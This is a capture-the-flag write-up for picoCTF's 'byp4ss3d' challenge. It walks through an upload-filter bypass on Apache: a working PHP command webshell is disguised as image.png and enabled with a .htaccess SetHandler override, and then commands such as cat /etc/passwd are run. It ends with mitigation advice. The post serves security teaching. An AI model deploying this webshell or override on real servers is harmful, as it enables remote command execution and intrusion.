---
title: 'picoCTF byp4ss3d'
date: 2026-02-02
description: "This writeup covers my solution to picoCTF's byp4ss3d challenge."
author: 'Khashayar Khosrosourmi'
image:
    url: '/writeups/picoctf-byp4ss3d/thumbnail.png'
    alt: 'picoctf byp4ss3d thumbnail'
tags: ["ctf", "file-upload", "rce", "php", "apache"]
---

## Challenge Description
A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't. You can access the web application at here!

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot1.png)

## Hint 1
Apache can be tricked into executing non-PHP files as PHP with a `.htaccess` file.

## Hint 2
Try uploading more than just one file.

## Solution
In this challenge, there is a webpage where image files can be uploaded. After the upload is completed, the application provides a URL, and the uploaded image can be accessed directly.

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot2.png)

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot12.png)

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot13.png)

At this point, I suspected I might be able to disguise a simple PHP webshell as an image, upload it, and execute commands to retrieve the flag. But first, the backend technology needed to be identified. By inspecting the response headers, I found that the application was running on Apache and using PHP.

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot11.png)

Then I prepared a simple PHP webshell:

```php
<html>
    <body>
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
            <input type="SUBMIT" value="Execute">
        </form>
        <pre>
            <?php
                if(isset($_GET['cmd']))
                {
                    system($_GET['cmd'] . ' 2>&1');
                }
            ?>
        </pre>
    </body>
</html>
```
I saved this shell as `image.png` and uploaded it. The upload functionality appeared to only validate the file extension, which is a good scenario from an attacker’s point of view.

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot4.png)

However, the issue was that although the file had a .png extension, the server would not interpret PHP code unless the file was treated as a PHP script. When I tried to access the uploaded webshell, I received the following error:

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot14.png)

This happened because Apache does not execute PHP code inside files with a .png extension by default.
Therefore, I needed a way to configure the server to treat other file types as PHP.

### .htaccess file
The hints pointed to a file named .htaccess. With some research, I learned that `.htaccess` is a directory-level configuration file supported by Apache. It can be used to override certain server settings within a specific folder.

For this challenge, the SetHandler directive could be abused to force Apache to execute PHP code regardless of the file extension. I created a `.htaccess` file with the following content:

```

SetHandler php-script
```

Then I uploaded the file.

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot3.png)

If the configuration was applied successfully, the previously uploaded image should no longer render normally. When I revisited the image URL, the error confirmed that the server was now treating the file differently:

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot7.png)

Now I was able to access the uploaded webshell:

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot5.png)

From here, I executed the `whoami` command to identify the current user:

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot6.png)

Then I ran `cat /etc/passwd` to confirm the environment and locate the home directory of the web server user:

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot8.png)

The user www-data was associated with the directory `/var/www`.

Next, I listed the contents of that directory using:

`ls -al /var/www`

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot9.png)

The flag file was visible in the directory. Finally, I retrieved it by executing:

`cat /var/www/flag.txt`

![byp4ss3d 1](/writeups/picoctf-byp4ss3d/Screenshot10.png)

## Mitigation

To prevent this vulnerability, the server should disable unsafe .htaccess overrides (set AllowOverride None), enforce strict MIME-type validation instead of relying on file extensions, and store uploads outside the web root so they cannot be executed as scripts.
